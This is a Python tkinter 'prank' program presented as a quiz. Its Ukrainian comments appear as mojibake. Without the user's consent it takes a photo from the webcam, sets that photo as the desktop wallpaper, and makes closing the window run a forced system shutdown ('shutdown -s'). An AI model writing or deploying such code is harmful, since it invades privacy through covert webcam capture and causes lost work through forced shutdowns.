from http import server
from tkinter import *
from tkinter import messagebox
import os
import cv2
import struct
import ctypes


def crash():
    os.system('shutdown -s') # —Ñ—É–Ω–∫—Ü—ñ—è —è–∫–∞ –≤–∏–∫–ª—é—á–∞—î –ø–∫ :)

def on_close():
    if messagebox.showinfo(crash()):# –ø—Ä–∏ –Ω–∞–∂–∞—Ç—Ç—ñ –Ω–∞ –∑–∞–∫—Ä–∏—Ç—Ç—è –ø—Ä–æ–≥—Ä–∞–º–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è –∫—Ä–∞—à
        crash() # –ü—Ä–∏ —Ç–∞–∫–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∑–∞–∫—Ä–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–º—É —á–µ—Ä–µ–∑ –¥–∏—Å–ø–µ—Ç—á—Ä –∑–∞–¥–∞—á –∫–æ–º–ø –≤–∏–∫–ª—é—á–∏—Ç—å—Å—è

def b1_window(): #—Ñ—É–Ω–∫—Ü—ñ—è 1 –∫–Ω–æ–ø–∫–∏
    new_window_1 = Toplevel(tk) # –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –Ω–æ–≤–æ–≥–æ –≤—ñ–∫–Ω–∞
    new_window_1.title("ü§°")
    new_window_1.resizable(0, 0)
    new_window_1.wm_attributes("-topmost", 1)
    canvas_1 = Canvas(new_window_1, width = 300, height = 200, bg = "black", highlightthickness = 0)
    canvas_1.pack()
    label_1 = Label(new_window_1, text = "–Ω–µ –≤–≥–∞–¥–∞–≤)", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))
    label_1.place(x = 50, y = 50)

def b2_window(): # –§—É–Ω–∫—Ü—ñ—è 2 –∫–Ω–æ–ø–∫–∏
    new_window_2 = Toplevel(tk) # –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –Ω–æ–≤–æ–≥–æ –≤—ñ–∫–Ω–∞
    new_window_2.title("ü§°")
    new_window_2.resizable(0, 0)
    new_window_2.wm_attributes("-topmost", 1)
    canvas_2 = Canvas(new_window_2, width = 300, height = 200, bg = "black", highlightthickness = 0)
    canvas_2.pack()
    label_2 = Label(new_window_2, text = "–∞–≥–∞))", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))
    label_2.place(x = 0, y = 50)

tk = Tk()

tk.protocol('WM_DELETE_WINDOW', on_close) #–ü—Ä–∏ –Ω–∞–∂–∏–º–∞–Ω—ñ –Ω–∞ —Ö—Ä–µ—Å—Ç–∏–∫ —Å–ø—Ä–∞—Ü—å–æ–≤—É—î —Ñ—É–Ω–∫—Ü—ñ—è on_close
tk.title("–í—ñ–∫—Ç–æ—Ä–∏–Ω–∞") # –ù–∞–∑–≤–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –≤—ñ–∫–Ω–∞
tk.resizable(0, 0) #–ù–µ –º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä–∏ –≤—ñ–∫–Ω–∞
tk.wm_attributes("-topmost", 1) # –≤—ñ–∫–Ω–æ —è–∫–µ –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è –±—É–¥–µ –ø–æ–≤–µ—Ä—Ö –≤—Å—ñ—Ö –æ—Å—Ç–∞–ª—å–Ω–∏—Ö –≤—ñ–∫–æ–Ω

# –ó–Ω—ñ–º–æ–∫ –∑ –∫–∞–º–µ—Ä–∏
try:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("image1.png", frame)
    cap.release()

    PATH = "image1.png"
    SPI_SETDESKWALLPAPER = 20

    def is_64bit_windows():
        """Check if 64 bit Windows OS"""
        return struct.calcsize('P') * 8 == 64

    def changeBG(path):
        """Change background depending on bit size"""
        if is_64bit_windows():
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)
        else:
            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)

    changeBG(PATH)

except:
    pass

canvas = Canvas(tk, width = 600, height = 400, bg = "black", highlightthickness = 0)# –û—Å–Ω–æ–≤–Ω–µ –≤—ñ–∫–Ω–æ —ñ –π–æ–≥–æ —Å—Ç–∏–ª—ñ
canvas.pack()

label = Label(tk, text = "–ó —Ç–≤–æ—ó–º –ø–∫ –≤—Å–µ –æ–∫?", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))# –∑–∞–≥–æ–ª–æ–≤–æ–∫
label.place(x = 125, y = 150)

b1 = Button(tk, text = "          —Ç–∞–∫         ", font = ("Times New Roman", 15, "bold"), command = b1_window)# –ö–Ω–æ–ø–∫–∞ 1 –∑—ñ —Å—Ç–∏–ª—è–º–∏
b1.place(x = 100, y = 300)

b2 = Button(tk, text = "         –Ω—ñ         ", font = ("Times New Roman", 15, "bold"), command = b2_window)# 2 –∫–Ω–æ–ø–∫–∞
b2.place(x = 400, y = 300)

tk.mainloop()